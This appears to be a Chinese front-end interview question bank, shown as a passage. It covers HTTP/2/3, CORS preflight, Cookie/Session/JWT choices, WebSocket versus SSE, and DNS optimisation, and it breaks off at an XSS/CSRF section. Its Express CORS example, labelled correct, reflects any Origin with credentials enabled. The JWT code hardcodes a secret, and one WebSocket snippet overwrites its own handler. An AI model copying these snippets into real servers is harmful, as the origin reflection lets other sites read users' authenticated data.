HTTP/2 还慢在哪儿？——仍依赖单条 TCP，任一包丢失整连接等重传（传输层队头阻塞），弱网下可能不如 1.1
HTTP/3 为什么不用 TCP？——TCP 的有序可靠语义导致队头阻塞无法在应用层绕过，QUIC 在 UDP 上自实现独立流的可靠传输

@example
### 1. 用 curl 查看当前走的是哪个 HTTP 版本

```bash
# --http2 让 curl 尝试协商 HTTP/2（靠 ALPN 在 TLS 握手时协商）
curl -sI --http2 https://example.com | head -n 1
# 返回 HTTP/2 200 说明成功协商到 2

# 强制 HTTP/3（需要 curl 编译时带 nghttp3/quiche）
curl -sI --http3 https://example.com | head -n 1
# 返回 HTTP/3 200 说明走了 QUIC

# 看协商细节：ALPN 字段会显示最终选中的协议（h2 / h3）
curl -v --http2 https://example.com 2>&1 | grep -i 'ALPN\|HTTP/2\|HTTP/3'
```

### 2. HTTP/2 多路复用：同一连接上的多个流

```text
# HTTP/1.1：一条连接上必须排队（应用层队头阻塞）
# 请求A ---等待响应A--- 请求B ---等待响应B--- 请求C
# 浏览器被迫开 6 条连接并发，互相抢带宽

# HTTP/2：一条连接，帧交错，互不阻塞
# 流1: [HEADERS][DATA]............[DATA]
# 流2: ......[HEADERS][DATA]..........[DATA]
# 流3: ..........[HEADERS]....[DATA].......[DATA]
# 三个流的帧在同一个 TCP 连接里穿插发送，谁先就绪谁先传
#
# 隐患：底层这一个 TCP 包丢了 -> 流1/2/3 全部停下等重传（传输层队头阻塞）
# HTTP/3 的解法：每个流在 QUIC 里独立，丢的只是某一流，其余照跑
```

### 3. Nginx 开启 HTTP/2 / HTTP/3

```nginx
server {
    listen 443 ssl;
    http2 on;                       # 开启 HTTP/2（现代 Nginx 默认已对 443 开启）
    # HTTP/3：监听 UDP 443，并 advertitise 支持 h3
    listen 443 quic reuseport;
    ssl_protocols TLSv1.3;          # HTTP/3 依赖 TLS 1.3

    # 告诉客户端「我也支持 HTTP/3」，浏览器下次可直连 UDP
    add_header Alt-Svc 'h3=":443"; ma=86400';

    location / {
        proxy_pass http://backend;
    }
}
# 注意：开了 HTTP/3 后，前端以前为了 1.1 做的「域名分片」
# 反而增加额外 QUIC 握手，应把静态资源收敛回同一域名
```

### 4. 前端如何确认并善用 HTTP/2

```javascript
// 在浏览器里读 Performance Resource Timing，看协议版本
const entries = performance.getEntriesByType('resource')
for (const e of entries) {
  // nextHopProtocol 会是 'h2' / 'h3' / 'http/1.1'
  console.log(e.name, '=>', e.nextHopProtocol)
}

// 结论性的工程建议（写在注释里，便于团队对齐）：
// 1. HTTP/2 下不要再域名分片，收敛到同一域以复用单连接多路复用
// 2. 小文件过多仍会拖慢（每流有开销），适度合并关键资源
// 3. 用 <link rel=preload> 在连接建立后立刻推关键资源，配合多路复用生效
```

## 06 · 跨域是怎么产生的，CORS 的完整流程是什么
@id
network-cors

@level
进阶

@freq
3

@tags
跨域 | CORS | 预检请求

@ask
跨域报错你肯定见过，但我想听你把「同源策略」和「CORS 预检」彻底讲清楚：到底什么算同源？浏览器为什么拦跨域请求？简单请求和预检请求怎么区分，预检到底预检了什么？

@oral
**一句话结论**：跨域本质是**浏览器的同源策略在拦**，而不是服务器拦；CORS 是服务端通过一组响应头「告诉浏览器：这个跨域请求我允许」，浏览器才放行。流程分两种情况：**简单请求**直接发、**非简单请求**先发一个 `OPTIONS` 预检、通过后才发真实请求。

**先说同源策略与「什么算同源」**。同源要求**协议、域名、端口**三者完全一致，缺一不可——`http` 与 `https` 不同源，不同子域（`a.x.com` 与 `b.x.com`）不同源，同域不同端口（`x.com:80` 与 `x.com:81`）也不同源。同源策略限制的是：一个源的 JS 不能读另一个源的响应（DOM、Cookie、fetch 响应等），但**写操作（如表单提交、img/script 标签）天然不拦**——所以 `<script src>`、`<img>` 能跨域加载，但 `fetch` 拿回来的响应会被浏览器以「跨域」为由拦掉。注意：拦截发生在**拿到响应之后**，请求其实已经发出去了，所以别以为跨域请求服务端没收到。

**简单请求 vs 预检请求**。满足全部条件的才是简单请求：方法是 `GET/HEAD/POST` 之一；头部只限于 `Accept`、`Accept-Language`、`Content-Type` 等安全头；且 `Content-Type` 只能是 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded` 三者之一。简单请求**不带自定义头、不发 Preflight**，直接发，靠响应头的 `Access-Control-Allow-Origin` 决定是否放行。

**预检（Preflight）流程**是重点。当请求是 `PUT/DELETE`、带了 `Authorization` 等自定义头、或 `Content-Type` 是 `application/json` 时，浏览器**先自动发一个 `OPTIONS` 请求**，带上 `Access-Control-Request-Method` 和 `Access-Control-Request-Headers`，问服务端「我打算用这个方法、这些头，你允不允许」。服务端回 `Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`、`Access-Control-Max-Age` 等，浏览器比对没问题，**才发真正的请求**。预检本身不带业务数据，且可缓存（`Max-Age`）避免每次都问。

**讲个真实踩坑**。我们网关一开始只在校验 `Origin` 后回 `Allow-Origin`，却忘了给 `OPTIONS` 单独放行，结果所有 `application/json` 的 POST 都卡在预检 403，前端疯狂报 CORS。补上 `if (method === 'OPTIONS') return 204` 并配齐 `Allow-Methods/Headers` 才解决。另外 `Allow-Origin` 不要图省事写 `*`，一旦要带凭证（`withCredentials`）就必须写**具体域名**且配 `Allow-Credentials: true`，`*` 和 credentials 不能共存。

**边界与取舍**：CORS 是「浏览器执行、服务端授权」的模型，后端/网关没配好就会出现各种诡异报错；另外跨域还有 `JSONP`（老派 script 注入，只支持 GET）、反向代理（把请求转到同域，最省心）、`postMessage`（页面间通信）等替代方案，面试能随口说出它们的适用边界是加分项。

**收尾**：同源看协议域端口三件套；跨域是浏览器拦响应、靠 CORS 头授权；简单请求直发、复杂请求先 OPTIONS 预检再发真请求。

@points
同源 = 协议 + 域名 + 端口三者全同；跨域是浏览器拦响应而非服务器拦请求，请求实际已发出
简单请求条件严格（GET/POST/HEAD、安全头、受限 Content-Type），直接发、靠 Allow-Origin 放行
非简单请求（自定义头、PUT/DELETE、json 等）先发 OPTIONS 预检，通过才发真实请求
预检由浏览器自动发起，携带想用的方法/头，服务端用 Allow-Methods/Headers 应答并可缓存
带凭证时 Allow-Origin 必须写具体域名且 Allow-Credentials=true，不能用 *

@steps
判断请求是否同源：协议、域名、端口三者逐一比对，任一不同即跨域
判定是否为简单请求：方法、头部、Content-Type 是否全在安全范围内
简单请求直接发出，浏览器检查响应里的 Access-Control-Allow-Origin 决定是否暴露
非简单请求先发 OPTIONS 预检，带 Request-Method / Request-Headers
服务端回 Allow-Methods / Allow-Headers / Max-Age，浏览器校验通过
校验通过后发出真实请求，再次校验响应头后把结果交给 JS

@followups
跨域请求服务端到底收到没？——收到了，浏览器是在「拿到响应后」才因缺少 CORS 头而拦截，请求和响应都真实发生
预检请求会带 Cookie 和业务数据吗？——不会，OPTIONS 预检不带凭证和业务体，只问权限；真实请求才带
Allow-Origin 写 * 为什么带凭证会失效？——规范规定带 credentials 时 Allow-Origin 不能为 *，必须明确列出请求方源

@example
### 1. 触发预检的典型前端请求

```javascript
// 这个请求不是简单请求：方法是 PUT，且带自定义头 Authorization，
// Content-Type 还是 application/json -> 浏览器会自动先发 OPTIONS 预检
fetch('https://api.example.com/user/1', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer xxxx', // 自定义头，触发预检
  },
  body: JSON.stringify({ name: 'lyf' }),
  credentials: 'include', // 带 Cookie，要求服务端 Allow-Credentials
})
```

### 2. 预检请求与响应的真实报文

```http
# 浏览器自动发出的 OPTIONS 预检
OPTIONS /user/1 HTTP/1.1
Origin: https://www.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type

# 服务端应答：明确允许的方法、头，以及缓存时长
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

# 预检通过后，浏览器才发真实 PUT 请求，响应也要带回 Allow-Origin
PUT /user/1 HTTP/1.1
Origin: https://www.example.com
Content-Type: application/json
Authorization: Bearer xxxx

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
```

### 3. 服务端（Express）正确配置 CORS

```javascript
const express = require('express')
const app = express()

// 关键：OPTIONS 预检必须单独放行，否则复杂请求全卡在预检
app.use((req, res, next) => {
  const origin = req.headers.origin
  // 生产里应白名单校验 origin，而不是无脑反射回去
  res.setHeader('Access-Control-Allow-Origin', origin || '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
  res.setHeader('Access-Control-Allow-Credentials', 'true')
  res.setHeader('Access-Control-Max-Age', '86400')
  if (req.method === 'OPTIONS') return res.sendStatus(204) // 预检直接返回，不进业务
  next()
})
app.listen(3000)
```

### 4. 不用 CORS 的两条常见出路

```nginx
# 出路一：反向代理，把跨域变成同源（最省心，前端无感知）
# 浏览器访问同域 /api，Nginx 转发到真实后端，同源策略不再触发
location /api/ {
    proxy_pass https://api.example.com/;
    proxy_set_header Host api.example.com;
}
```

```html
<!-- 出路二：JSONP，利用 script 标签不受同源限制，仅支持 GET -->
<script>
  function handle(json) { console.log('跨域拿到的数据：', json) }
</script>
<script src="https://api.example.com/data?callback=handle"></script>
<!-- 服务端把数据包成 handle({...}) 返回，靠全局函数回调拿值 -->
```

## 07 · Cookie、Session、Token、JWT 的区别与选型

@id
network-auth

@level
进阶

@freq
3

@tags
Cookie | JWT | 鉴权

@ask
鉴权这套你肯定绕不开，我想听你把 Cookie、Session、Token、JWT 这四样说清楚：它们各自存在哪、怎么验证身份？Session 和 JWT 本质上有什么不同？什么场景该用哪个，别只说「JWT 好」。

@oral
**一句话结论**：这四样不是同一层的概念——**Cookie 是浏览器存凭证的容器，Session 是服务端存状态的方案，Token 是一类「无状态令牌」的统称，JWT 是 Token 的一种具体格式**。选型的本质是「把登录状态放在服务端（Session）还是放在客户端（JWT/Token）」的权衡。

**先拆清楚各自是什么**。**Cookie** 是浏览器按域名存储的小块数据（通常 4KB 上限），每次同域请求自动带在请求头里，有 `HttpOnly`（防 JS 读，抗 XSS）、`Secure`（仅 HTTPS）、`SameSite`（防 CSRF）等属性。**Session** 是服务端把用户状态存在内存/Redis 里，只给浏览器一个 `sessionId` 存在 Cookie 里，每次请求靠这个 id 去服务端查状态——**状态在服务端**。**Token** 泛指一串代表身份的令牌，典型如 **JWT（JSON Web Token）**：把用户信息（payload）用签名（HMAC 或 RSA）包成一个 `header.payload.signature` 的字符串，**服务端不存状态，靠验签就知道真伪**——**状态在客户端**。

**Session 与 JWT 的本质差异**。Session 是「有状态」：服务端要维护会话表，水平扩容时得用共享存储（Redis）或粘滞会话；优点是随时可踢人（删服务端记录）、可控性强。JWT 是「无状态」：服务端不存，令牌自带过期时间、验签即可信，特别适合**分布式/无中心、跨服务、移动端/第三方调 API** 的场景；缺点是**签发后无法主动作废**（除非引入黑名单或短过期+刷新令牌），且 payload 默认只 Base64 编码、可被读，绝不能放敏感信息。

**讲个真实选型**。我们 To C 的 Web 登录早期用 Session + Redis，踢人、改权限立刻生效，体验好；后来做开放 API 给合作方，对方是异构系统、还要跨域调用，Session 的 Cookie 机制和中心化存储就成了障碍，于是 API 侧切到 **JWT + 短期 access token（15 分钟）+ 长期 refresh token（存 HttpOnly Cookie）**：access 泄露窗口小、refresh 可吊销。等于**扬长避短**：Web 内用 Session 控权限，对外 API 用 JWT 解耦。

**边界与取舍**：别迷信 JWT。如果就一个单体应用、又需要频繁吊销，Session 反而更简单；JWT 的「无状态」优势在单节点场景完全体现不出来，还多背上签名校验和无法吊销的麻烦。还有：**Token 别放 localStorage**（易被 XSS 偷），放 HttpOnly Cookie 或内存更稳。

**收尾**：Cookie 是载体、Session 是服务端状态、Token/JWT 是把状态交给客户端；选型看你是需要「随时可控」还是要「去中心、好扩展」，而不是哪个时髦用哪个。

@points
Cookie 是浏览器存凭证的容器，Session 是服务端存状态的方案，Token/JWT 是客户端令牌
Session 有状态：服务端存会话，靠 sessionId 查，易踢人但需共享存储才能扩容
JWT 无状态：payload+签名，服务端不存，易扩展但签发后难主动作废、payload 不可放敏感信息
JWT 适合分布式/跨域/第三方 API；单体且要频繁吊销时 Session 更简单
Token 放 HttpOnly Cookie 或内存，勿放 localStorage 以防 XSS 窃取

@steps
用户登录，服务端校验账号密码
Session 方案：服务端存会话状态，下发 sessionId 写入 Cookie
Token/JWT 方案：服务端签发带签名和过期的令牌，返回客户端自持
后续请求：Session 靠 Cookie 带 sessionId 查状态；JWT 靠请求头带令牌验签
鉴权通过后返回资源；过期/失效则要求重新登录或刷新令牌
按需选型：对内 Web 用 Session 控权限，对外 API 用 JWT 解耦

@followups
JWT 被窃取了能立刻作废吗？——默认不能，因为它无状态；常用做法是短过期 + refresh token 黑名单，或维护一个吊销列表
JWT 的 payload 加密了吗？——没有，只是 Base64Url 编码，谁都能解码读；签名只保证不被篡改，敏感信息绝不能放进去
SameSite Cookie 和 CSRF 什么关系？——SameSite=Strict/Lax 能阻止第三方上下文携带 Cookie，是防 CSRF 的重要手段，配合 HttpOnly 和 CSRF Token 更稳

@example
### 1. JWT 的结构与本地验签

```text
# JWT 由三段用点隔开，均为 Base64Url 编码
# header.payload.signature
# 例如：eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsImV4cCI6... .5f4d...

# header（算法与类型，可被解码读出，不含秘密）
{ "alg": "HS256", "typ": "JWT" }

# payload（业务声明，注意：只是编码不是加密，别放密码/身份证）
{ "uid": 1, "role": "admin", "exp": 1760000000 }

# signature = HMAC-SHA256(base64(header)+'.'+base64(payload), 密钥)
# 服务端拿到令牌后重算签名比对，一致即未被篡改且可信
```

```javascript
// 前端只负责「持有与携带」，校验永远在服务端
// access token 放内存，refresh token 放 HttpOnly Cookie（防 XSS）
let accessToken = null

async function login(user, pass) {
  const res = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include', // refresh token 走 Cookie
    body: JSON.stringify({ user, pass }),
  })
  const data = await res.json()
  accessToken = data.accessToken // 短命令牌存内存
}

// 请求时把 access token 放 Authorization 头（Bearer 方案）
function authFetch(url, opt = {}) {
  return fetch(url, {
    ...opt,
    headers: { ...opt.headers, Authorization: `Bearer ${accessToken}` },
  })
}
```

### 2. 服务端签发与校验 JWT（Node）

```javascript
const jwt = require('jsonwebtoken')

// 签发：设置短过期（15 分钟），敏感信息绝不进 payload
function signToken(uid) {
  return jwt.sign({ uid }, '服务端私钥', { expiresIn: '15m' })
}

// 校验：签名不对或过期都会抛错，无需查库（无状态优势）
try {
  const payload = jwt.verify(clientToken, '服务端私钥')
  console.log('合法用户：', payload.uid)
} catch (e) {
  console.log('令牌无效或过期，要求重新登录')
}
```

### 3. 安全设置 Cookie 的属性

```http
# 登录成功后，服务端通过 Set-Cookie 下发会话标识
# HttpOnly：JS 读不到，挡住 XSS 偷 Cookie
# Secure：只在 HTTPS 下传输
# SameSite=Lax：跨站请求不自带 Cookie，缓解 CSRF
# Max-Age：控制生命周期
Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=86400; Path=/
```

### 4. 前端错误地用 localStorage 存 Token 的反面教材

```javascript
// 反例：把 JWT 存 localStorage，任何 XSS 都能一行拿走
localStorage.setItem('token', jwtString)
// 攻击者只要注入：localStorage.getItem('token') 就能拿到并外传

// 正解：access token 存内存变量，refresh token 交给 HttpOnly Cookie
// 即使页面被 XSS，内存里的 token 难以被稳定读取，Cookie 又因 HttpOnly 拿不到
```

## 08 · WebSocket 和 SSE 的区别，什么时候用哪个

@id
network-websocket-sse

@level
进阶

@freq
3

@tags
WebSocket | SSE | 长连接

@ask
实时通信你做过吧。WebSocket 和 SSE 都能做服务端推送，我想听你对比一下：它们底层各基于什么、谁是双工谁是单工、各自适合什么场景？别光说「都能推送」，我要听你怎么选型。

@oral
**一句话结论**：**WebSocket 是全双工长连接**，客户端服务端随时互发；**SSE（Server-Sent Events）是基于 HTTP 的单向通道，只能服务端推给客户端**。选型看「要不要客户端也频繁上行」——纯服务器推送选 SSE，要双向实时通信选 WebSocket。

**先讲底层与连接模型**。**WebSocket** 握手时借一次 HTTP 请求，带 `Upgrade: websocket` 头，**协议从 HTTP 升级成 ws 协议**，之后就是一条独立的全双工 TCP 长连接，两端随时发二进制或文本帧，没有「请求-响应」的语义束缚。**SSE** 完全不同：它**就是普通的 HTTP 长连接**，服务端用 `Content-Type: text/event-stream` 保持连接打开，持续往里写 `data:` 格式的文本块，浏览器用 `EventSource` API 接收。所以 SSE 天然走 HTTP、能直接用现有 CDN/网关/缓存，而 WebSocket 往往要单独放行 Upgrade。

**双向能力是核心差异**。**WebSocket 全双工**：聊天、协同编辑、游戏这类「客户端也要高频发消息」的场景毫无压力。**SSE 是单向（服务端→客户端）**：如果客户端也要发数据，只能另起普通 HTTP 请求（POST）去发，等于「下行推送用 SSE、上行用普通请求」。对很多监控大屏、股票行情、日志流这种「服务端一直推、客户端偶尔上报」的场景，SSE 完全够用，而且更简单。

**其他差异与边界**。**断线重连**：SSE 的 `EventSource` **浏览器原生自动重连**，还能用 `Last-Event-ID` 让服务端补发漏掉的；WebSocket 重连要自己写。**数据格式**：SSE 只支持文本（二进制要自己编解码），WebSocket 原生支持二进制帧。**鉴权**：SSE 走标准 HTTP，Cookie/Header 直接带；WebSocket 握手时也能带，但后续帧不便附鉴权信息。**兼容性**：SSE 不支持 IE 且旧版 Edge 有问题，WebSocket 现代浏览器都支持。

**讲个真实选型**。我们做「构建日志实时输出」功能，服务端不断吐日志行、前端展示，客户端只需要偶尔发「暂停/筛选」指令（用普通 POST 即可）。一开始用 WebSocket，结果要多写心跳、重连、鉴权逻辑，还占了独立的 ws 端口让运维头疼；后来换成 **SSE + 普通 HTTP 上报**，重连浏览器自动兜底，网关零改造，代码量减半。反之，如果是客服聊天，消息双向高频，那必须用 WebSocket，SSE 上行就只能靠另发请求、体验割裂。

**边界与取舍**：SSE 简单、自动重连、复用 HTTP 生态，但只能服务端推；WebSocket 灵活双向、能传二进制，但要自己管连接生命周期。别为了「看起来高级」用 WebSocket 去扛一个纯下行场景。

**收尾**：要双向实时 → WebSocket；要服务端单向推送、且想省心 → SSE；二者不是替代关系，是看上行需求有没有。

@points
WebSocket 是 HTTP 升级出的全双工独立长连接，SSE 是基于 HTTP 的单向 text/event-stream 推送
WebSocket 双向随时收发；SSE 仅服务端→客户端，客户端上行需另发普通请求
SSE 的 EventSource 原生自动重连并支持 Last-Event-ID 补发，WebSocket 需自写重连
SSE 只传文本、走标准 HTTP 易复用现有网关/CDN；WebSocket 支持二进制但需单独放行
选型：双向高频（聊天/协同）用 WebSocket；纯下行推送（行情/日志）用 SSE 更省心

@steps
明确需求：是否需要客户端也高频上行，还是仅服务端推送
仅需服务端推送 → 选 SSE，服务端保持 text/event-stream 长连接，前端用 EventSource 收
需要双向实时 → 选 WebSocket，握手 Upgrade 后建立全双工连接
SSE 利用浏览器自动重连与 Last-Event-ID 保证不丢；WebSocket 自行实现心跳与重连
SSE 上行指令走普通 POST；WebSocket 上下行共用一条连接
按生态选型：SSE 复用 HTTP 网关/CDN；WebSocket 需单独端口与运维支持

@followups
SSE 断线了会丢数据吗？——EventSource 原生自动重连，且重连时会带上 Last-Event-ID，服务端可据此补发断连期间的数据
WebSocket 和 SSE 谁更省资源？——连接数相当时相近；但 SSE 复用 HTTP 生态、无需额外端口和自写重连，开发与运维成本更低
SSE 能发二进制吗？——标准只支持文本，二进制需自行 Base64 或编码进文本；要原生二进制优先 WebSocket

@example
### 1. SSE 服务端（Node）与前端接收

```javascript
// 服务端：保持一个 text/event-stream 的长连接，持续推送
const http = require('http')
http.createServer((req, res) => {
  if (req.url === '/stream') {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream', // SSE 固定类型
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
    })
    // 每个事件用 data: 开头、两个换行结尾；id: 用于断线续传
    let n = 0
    const timer = setInterval(() => {
      res.write(`id: ${n}\ndata: 当前时间 ${new Date().toISOString()}\n\n`)
      n++
    }, 1000)
    req.on('close', () => clearInterval(timer)) // 客户端断开要清理
  }
}).listen(3000)
```

```javascript
// 前端：EventSource 自动重连，断线后浏览器会带上 Last-Event-ID
const es = new EventSource('/stream')
es.onmessage = (e) => {
  console.log('收到推送：', e.data) // 服务端每次 data 触发一次
}
es.onerror = () => {
  // 网络抖断 EventSource 会自动重连，无需手写；这里仅做提示
  console.warn('连接异常，浏览器正在自动重连…')
}
```

### 2. WebSocket 握手与双向通信

```http
# 客户端发起升级握手（仍是 HTTP 请求，但要求切换协议）
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# 服务端同意升级，之后协议变为 ws，不再是普通 HTTP 语义
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
# 握手完成后，双方在这条 TCP 上自由收发帧（全双工）
```

```javascript
// 前端 WebSocket：客户端也能随时发，区别于 SSE 的单向
const ws = new WebSocket('wss://example.com/chat')
ws.onopen = () => ws.send(JSON.stringify({ type: 'join', room: 'a' }))
ws.onmessage = (e) => console.log('服务端消息：', e.data)
// 必须自己维护心跳与重连
let alive = false
setInterval(() => { ws.send('ping'); alive = false }, 30000)
ws.onmessage = (e) => { if (e.data === 'pong') alive = true }
```

### 3. Nginx 转发 WebSocket（需特殊处理 Upgrade）

```nginx
# WebSocket 的 Upgrade 头默认不会被普通代理透传，必须显式配置
location /chat {
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;    # 透传升级头
    proxy_set_header Connection "upgrade";     # 标识为升级连接
    proxy_read_timeout 3600s;                  # 长连接超时调大，别被过早断开
}
# 对比：SSE 不需要这些，因为它本质就是普通 HTTP 长连接，按常规代理即可
```

### 4. 选型对照速查

```text
# 场景                 推荐      理由
# 客服聊天 / 协同编辑    WebSocket 双向高频，不能靠另发请求上行
# 股票行情 / 监控大屏    SSE       纯下行推送，浏览器自动重连省心
# 实时日志输出          SSE + POST 下行推送，上行指令用普通 HTTP 即可
# 需要传二进制（如音视频信令） WebSocket 原生支持二进制帧
# 老 IE 兼容 required     WebSocket（SSE 不被 IE 支持）
```

## 09 · DNS 解析过程与前端能做的优化

@id
network-dns

@level
进阶

@freq
2

@tags
DNS | prefetch | 优化

@ask
DNS 这块你了解多少？我想听你把一次域名解析从浏览器到根服务器的完整链路讲出来，再说说前端在项目里能针对 DNS 做哪些优化，别只说「加个 prefetch」就完了。

@oral
**一句话结论**：DNS 是把「人能记住的域名」翻译成「机器要用的 IP」的分布式系统，一次解析是「浏览器缓存 → 系统缓存 → hosts → 本地 DNS → 迭代查根/顶级/权威」的多级查找；前端能做的优化集中在「提前解析」和「减少解析次数」两块。

**先讲完整解析链路**。你在浏览器输入 `www.example.com`，第一步查**浏览器自身缓存**（Chrome 按 TTL 缓存，约 1 分钟量级，可在 `chrome://net-internals/#dns` 看）；没命中查**操作系统缓存**（系统 resolver，Windows 有 `ipconfig /displaydns`）；再没命中查本机 **hosts 文件**（可手动绑定，常被用于本地调试）；都失败才向**本地 DNS 服务器（通常是运营商或 8.8.8.8/223.5.5.5）**发起递归查询。本地 DNS 如果自己没缓存，就**迭代查询**：先问**根服务器**（.）拿到 `.com` 顶级域服务器地址，再问**顶级域（TLD）**拿到 `example.com` 的**权威服务器**，最后问**权威服务器**拿到 `www` 的 A/AAAA 记录，一路返回并缓存。整个过程涉及多次 UDP 往返，正常几十到上百毫秒，弱网下更明显。

**前端能做的优化，第一条是「提前解析」**。`<link rel="dns-prefetch" href="//cdn.example.com">` 让浏览器在空闲时提前把后续要用的域名解析好，等真发请求时省掉那一段延迟。对**跨域、且页面加载中较晚才用到**的第三方域名（统计、字体、CDN）收益最大。**preconnect 更进一步**：不仅解析 DNS，还把 TCP 和 TLS 也提前建好，适合首屏关键第三方域。

**第二条是「减少解析次数 / 收敛域名」**。HTTP/2 时代，把静态资源分散在多个子域（域名分片）反而有害——每个子域都要独立解析 + 独立握手，抵消了多路复用优势。把资源**收敛到同一域名**，靠一条连接的复用就够了。**第三条是 TTL 与 CDN**：给 DNS 记录设合理的 TTL，让各级缓存生效；用 **CDN** 把权威解析指向离用户最近的边缘节点（很多 CDN 用 GeoDNS，按来源 IP 返回最近 POP 的 IP），从根上缩短物理距离。

**讲个真实优化**。我们有个活动页引了 4 个第三方域名（统计、地图、字体、客服），首屏前 1 秒内这 4 个域名串行解析拖慢了首屏。我在 `<head>` 最前面加了 4 个 `dns-prefetch`（统计/字体这种能用的再加 `preconnect`），并把自有的静态资源从 `static1/2/3.example.com` 三个子域**收敛成一个 `cdn.example.com`**。结果是首屏可交互时间（TTI）降了约 300ms，DNS 相关耗时在 waterfall 里几乎消失。

**边界与取舍**：prefetch 太滥用会无谓消耗电量与连接（尤其移动端），只对「确定会用到且较晚出现」的域名加；HTTPS 站点的 dns-prefetch 最好配合 `crossorigin`，否则某些浏览器不会复用预解析的连接。另外 DNS 解析失败要做兜底（如多 DNS、HTTPDNS 绕过劫持），这是客户端/移动端更关注的。

**收尾**：解析是多级缓存 + 迭代查询，延迟集中在网络往返；前端用 prefetch/preconnect 提前解析、用域名收敛减少解析、用 CDN 缩短距离，三板斧基本够用。

@points
解析链路：浏览器缓存 → 系统缓存 → hosts → 本地 DNS → 迭代查根/TLD/权威，逐级命中即返回
根/TLD/权威是迭代查询，本地 DNS 负责递归，最终拿到 A/AAAA 记录并沿途缓存
dns-prefetch 让浏览器空闲时提前解析后续域名，适合跨域且较晚用到的第三方
preconnect 在解析基础上提前建 TCP+TLS，适合首屏关键第三方域
HTTP/2 下应收敛域名而非分片，配合 CDN/合理 TTL 进一步缩短解析与距离

@steps
浏览器先查自身 DNS 缓存，命中即用
未命中查操作系统缓存（系统 resolver）
仍未命中查本地 hosts 文件
以上皆失败，向本地 DNS 服务器发起递归查询
本地 DNS 迭代：根 → 顶级域 → 权威，拿到目标 IP 并缓存
前端在资源加载前用 prefetch/preconnect 提前完成上述解析与建连

@followups
根服务器知道所有域名吗？——不知道，根只告诉「.com 该问谁」，靠迭代一级级下钻到权威，根本身只存 TLD 地址
dns-prefetch 和 preconnect 怎么选？——仅解析用 prefetch 即可、成本低；要连 TCP/TLS 一起提前建、且是关键域名才用 preconnect
为什么 HTTP/2 不建议域名分片？——每个子域都要独立解析和握手，反而抵消了单连接多路复用的优势，应收敛域名

@example
### 1. 用 dig 看完整的迭代解析链

```bash
# +trace 模拟从根开始的迭代查询，能看到根/TLD/权威每一级
dig +trace www.example.com

# 只看最终答案（A 记录）和耗时
dig www.example.com +stats

# 分别查不同记录类型
dig example.com NS     # 权威服务器
dig example.com A      # IPv4 地址
dig example.com AAAA   # IPv6 地址

# 清本机 DNS 缓存后重试，验证缓存是否生效
# macOS:
sudo dscacheutil -flushcache
# Windows:
ipconfig /flushdns
```

### 2. 前端提前解析：prefetch 与 preconnect

```html
<!-- 放在 <head> 最前，让浏览器尽早安排预解析 -->
<!-- 仅提前解析 DNS，成本低，适合确定会用到、但出现较晚的第三方域 -->
<link rel="dns-prefetch" href="https://cdn.example.com">
<link rel="dns-prefetch" href="https://fonts.googleapis.com">

<!-- 不仅解析 DNS，还提前完成 TCP + TLS 握手，适合首屏关键第三方域 -->
<!-- crossorigin 必须与对方 CORS 一致，否则浏览器不会复用这条预连接 -->
<link rel="preconnect" href="https://api.example.com" crossorigin>

<!-- 反例：HTTP/2 下把静态资源分到多个子域 = 每个都要解析+握手，抵消复用 -->
<!-- 正解：收敛到单一 cdn.example.com，靠一条连接多路复用 -->
<link rel="dns-prefetch" href="https://cdn.example.com">
```

### 3. 系统层 hosts 本地绑定（调试常用）

```text
# Windows: C:\Windows\System32\drivers\etc\hosts
# macOS/Linux: /etc/hosts
# 把域名手动指向某个 IP，跳过公网 DNS，常用于本地/预发环境调试
# 格式：IP  域名（注意前面是 IP，且要对应真实服务监听的地址）
127.0.0.1       localhost
192.168.1.50    pre.example.com
# 改完无需重启，立刻生效；但只在「本机」生效，且会绕过 TTL 与 CDN
```

### 4. 用 CDN / GeoDNS 缩短物理距离

```text
# 普通权威解析：对所有用户返回同一个 IP（可能在很远的数据中心）
# example.com -> 1.2.3.4（北京机房）

# GeoDNS（智能解析）：CDN 按用户来源 IP 返回最近边缘节点
# 北京用户  -> 1.2.3.4   （北京 POP）
# 上海用户  -> 5.6.7.8   （上海 POP）
# 海外用户  -> 9.10.11.12（海外 POP）
# 这样 DNS 解析拿到的就是「地理最近」的 IP，RTT 大幅下降

# 前端感知不到差异，但配置上要把静态域名 CNAME 到 CDN 提供的接入域名
# 例如：cdn.example.com  CNAME  example.cdn-vendor.com
```

## 10 · 前端安全：XSS、CSRF 的原理与防御

@id
network-security

@level
进阶

@freq
3

@tags
XSS | CSRF | 安全

@ask
前端安全是必问的。你把 XSS 和 CSRF 讲透：它们俩本质区别是什么？XSS 有哪几种、各自怎么防？CSRF 又是怎么利用的、服务端和前端分别该怎么做防御？

@oral
**一句话结论**：**XSS 是「往页面里注入恶意脚本、在受害者浏览器执行」，偷数据/劫持会话；CSRF 是「借受害者的身份和 Cookie，以受害者名义发请求」，做受害者不知情的坏事**。一个偷「执行权」、一个偷「身份凭证」，防御思路完全不同。

